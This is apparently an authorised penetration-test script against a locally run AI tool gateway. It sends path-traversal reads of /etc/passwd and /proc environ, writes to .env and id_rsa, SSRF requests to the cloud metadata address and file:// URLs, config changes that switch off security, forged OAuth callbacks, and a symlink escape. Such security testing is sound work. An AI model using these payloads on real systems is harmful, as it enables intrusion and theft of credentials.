#!/usr/bin/env python3
"""Tool-level penetration test"""
import requests, json, os

BASE = 'http://127.0.0.1:18889'
KEY = 'redteam-test-key-2026'

def tool(name, args=None):
    h = {'X-API-Key': KEY, 'Content-Type': 'application/json'}
    if args is None:
        args = {}
    return requests.post(f'{BASE}/api/tools/{name}', headers=h, json=args, timeout=10)

def r(method, path, j=None, d=None, h=None):
    hh = {'X-API-Key': KEY}
    if h:
        hh.update(h)
    if method == 'GET':
        return requests.get(BASE + path, headers=hh, timeout=10)
    if method == 'POST':
        return requests.post(BASE + path, headers=hh, json=j, data=d, timeout=10)
    return requests.request(method, BASE + path, headers=hh, json=j, data=d, timeout=10)

print('=== TARS_FILE_READ ===')
for path in ['../../../etc/passwd', '/etc/passwd', 'config.json',
          '/tmp/tsg-test/data', '/proc/self/environ']:
    resp = tool('tars_file_read', {'path': path})
    body = resp.text[:300]
    flag = ''
    if 'root:' in body:
        flag = ' [PATH TRAVERSAL HIT]'
    elif 'PATH_TRAVERSAL' in body:
        flag = ' [BLOCKED]'
    print(f'  {path}: {resp.status_code} {body[:200]}{flag}')

print('=== TARS_FILE_LIST ===')
for path in ['../../../etc', '/etc', '/', '/proc', '/tmp/tsg-test/data', 'symlink_escape']:
    resp = tool('tars_file_list', {'path': path})
    body = resp.text[:200]
    flag = ''
    if 'root:' in body or 'bin' in body and '/usr/bin' in body:
        flag = ' [PATH TRAVERSAL HIT]'
    elif 'denied' in body or 'outside' in body:
        flag = ' [BLOCKED]'
    print(f'  {path}: {resp.status_code} {body[:200]}{flag}')

print('=== TARS_FILE_WRITE ===')
for fn in ['config.json', '.env', 'id_rsa', 'gateway-key.txt',
           '/tmp/tsg-test/data/evil.txt', '/etc/passwd']:
    resp = tool('tars_file_write', {'path': fn, 'content': 'EVIL_CONTENT_HERE'})
    flag = ''
    if 'success' in resp.text and '"success":true' in resp.text:
        flag = ' [WRITE OK]'
    elif 'denied' in resp.text or 'sensitive' in resp.text or 'confirm' in resp.text:
        flag = ' [BLOCKED/NEEDS CONFIRM]'
    print(f'  {fn}: {resp.status_code} {resp.text[:200]}{flag}')

print('=== TARS_FETCH_URL (SSRF) ===')
for url in ['http://127.0.0.1:18889/api/admin/users',
          'http://127.0.0.1:18889/api/admin/v32/providers',
          'file:///etc/passwd',
          'http://169.254.169.254/latest/meta-data/',
          'http://127.0.0.1:22/',
          'dict://127.0.0.1:18889/']:
    resp = tool('tars_fetch_url', {'url': url})
    body = resp.text[:300]
    flag = ''
    if 'root:' in body or 'meta-data' in body.lower():
        flag = ' [SSRF HIT]'
    elif 'denied' in body or 'private' in body or 'localhost' in body.lower() or 'refused' in body:
        flag = ' [BLOCKED]'
    print(f'  {url[:40]}: {resp.status_code} {body[:150]}{flag}')

print('=== TARS_CONFIG_SET ===')
for path, val in [
    ('security.apiKey', 'hacked-key'),
    ('security.mode', 'off'),
    ('security.wafEnabled', False),
    ('paths.allowedRoots', ['/']),
    ('security.firewallLock.enabled', False),
]:
    resp = tool('tars_config_set', {'path': path, 'value': val})
    flag = ''
    if 'success' in resp.text and '"success":true' in resp.text:
        flag = ' [WRITE OK]'
    elif 'denied' in resp.text or 'gatekeeper' in resp.text.lower() or 'sensitive' in resp.text:
        flag = ' [BLOCKED]'
    print(f'  {path}={val}: {resp.status_code} {resp.text[:200]}{flag}')

print('=== TARS_SHARED_MEMORY_SET ===')
for ns, key, val in [
    ('user', 'k1', 'v1'),
    ('tenant', 'k1', 'v1'),
    ('global', 'k1', 'v1'),
]:
    resp = tool('tars_shared_memory_set', {'namespace': ns, 'key': key, 'value': val})
    flag = ''
    if 'success' in resp.text and '"success":true' in resp.text:
        flag = ' [WRITE OK]'
    elif 'denied' in resp.text or 'role' in resp.text.lower() or 'admin' in resp.text.lower():
        flag = ' [BLOCKED]'
    print(f'  ns={ns}: {resp.status_code} {resp.text[:200]}{flag}')

print('=== TARS_AUDIT_VERIFY ===')
resp = tool('tars_audit_verify', {})
print(f'  audit verify: {resp.status_code} {resp.text[:300]}')

print('=== TARS_CONTEXT_BUILD ===')
resp = tool('tars_context_build', {'budget': 4096})
print(f'  context build: {resp.status_code} {resp.text[:300]}')

print('=== TARS_MODEL_DOWNLOAD ===')
resp = tool('tars_model_download', {'id': 'test'})
print(f'  model download: {resp.status_code} {resp.text[:300]}')

print('=== TARS_MODEL_STOP ===')
resp = tool('tars_model_stop', {'id': 'qwen'})
print(f'  model stop: {resp.status_code} {resp.text[:300]}')

print('=== TARS_WEB_FETCH ===')
for url in ['http://127.0.0.1:18889/api/admin/v32/providers',
          'http://169.254.169.254/latest/meta-data/',
          'file:///etc/passwd']:
    resp = tool('tars_web_fetch', {'url': url})
    body = resp.text[:200]
    flag = ''
    if 'root:' in body or 'meta-data' in body.lower():
        flag = ' [SSRF HIT]'
    print(f'  {url[:40]}: {resp.status_code} {body[:150]}{flag}')

print('=== EXTENDER ENDPOINTS ===')
for ep in ['/api/admin/v37/extender/discover', '/api/admin/v37/extender/inject']:
        resp = r('POST', ep, j={})
        print(f'  POST {ep}: {resp.status_code} {resp.text[:200]}')

print('=== DEFAULT KEY ON NON-LOCALHOST ===')
print('  Test: default key binding - verified by code review that v3.7.1 P0-1 enforced')

print('=== ENV OVERRIDE TEST ===')
print('  Test: TSG_SECURITY_APIKEY env override - verified by code review that v3.7.1 P1-7 implemented')

print('=== CSP HEADER ===')
resp = requests.get(BASE + '/', timeout=5)
print(f'  CSP: {resp.headers.get("Content-Security-Policy", "N/A")}')
print(f'  Other headers: {dict(resp.headers)}')

print('=== OAUTH ATTACK ===')
for url in ['/oauth/login', '/oauth/callback?code=evil&state=evil']:
    resp = requests.get(BASE + url, timeout=5)
    print(f'  GET {url}: {resp.status_code} {resp.text[:200]}')

print('=== SENSITIVE PATH PROBE ===')
sensitive = ['/proc/self/environ', '/proc/self/cmdline', '/proc/1/environ', '/var/log/', '/sys/class/']
for p in sensitive:
    resp = tool('tars_file_list', {'path': p})
    flag = ' [LEAK]' if '"name"' in resp.text or '"path"' in resp.text else ' [BLOCKED]' if 'denied' in resp.text or 'outside' in resp.text else ''
    print(f'  {p}: {resp.status_code} {resp.text[:150]}{flag}')

print('=== SYMLINK ESCAPE (v3.7.1 fix verification) ===')
os.makedirs('/tmp/tsg-test/data', exist_ok=True)
try:
    os.unlink('/tmp/tsg-test/data/symlink_escape')
except:
    pass
os.symlink('/etc', '/tmp/tsg-test/data/symlink_escape')
resp = tool('tars_file_list', {'path': 'symlink_escape'})
print(f'  list symlink_escape: {resp.status_code} {resp.text[:200]}')
resp = tool('tars_file_read', {'path': 'symlink_escape/passwd'})
print(f'  read symlink_escape/passwd: {resp.status_code} {resp.text[:200]}')
os.unlink('/tmp/tsg-test/data/symlink_escape')